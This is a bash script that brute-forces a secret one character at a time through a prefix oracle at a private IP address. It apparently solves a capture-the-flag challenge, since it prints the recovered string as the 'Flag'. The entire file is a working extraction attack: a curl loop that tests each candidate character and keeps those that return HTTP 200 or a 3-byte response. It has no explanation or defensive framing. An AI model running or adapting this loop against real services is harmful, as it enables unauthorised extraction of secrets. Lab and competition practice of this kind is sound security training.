#!/bin/bash

URL="http://10.110.3.72:8016/oracle"
CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-./{}"

# Start with what we already know works ('f')
KNOWN_PREFIX="f"

echo "[*] Starting extraction with initial prefix: '$KNOWN_PREFIX'"
echo "----------------------------------------"

while true; do
    FOUND=false
    
    for (( i=0; i<${#CHARS}; i++ )); do
        CHAR="${CHARS:i:1}"
        TEST_PREFIX="${KNOWN_PREFIX}${CHAR}"
        
        # Make request: use a distinct delimiter (like a colon or tab) and keep curl quiet (-s)
        RESPONSE=$(curl -s -w "%{http_code}\t%{size_download}" -G "$URL" --data-urlencode "prefix=$TEST_PREFIX")
        STATUS=$(echo "$RESPONSE" | awk -F'\t' '{print $1}')
        LEN=$(echo "$RESPONSE" | awk -F'\t' '{print $2}')
        
        # Look for the successful 200 OK indicator
        if [[ "$STATUS" == *"200"* ]] || [ "$LEN" -eq 3 ]; then
            KNOWN_PREFIX="$TEST_PREFIX"
            echo "[+] MATCH FOUND! Current prefix: $KNOWN_PREFIX"
            FOUND=true
            break
        fi
    done
    
    # If a full round finishes and no new character matched, we've hit the end
    if [ "$FOUND" = false ]; then
        echo "----------------------------------------"
        echo "[*] Extraction complete!"
        echo "[+] Final Result / Flag: $KNOWN_PREFIX"
        break
    fi
done
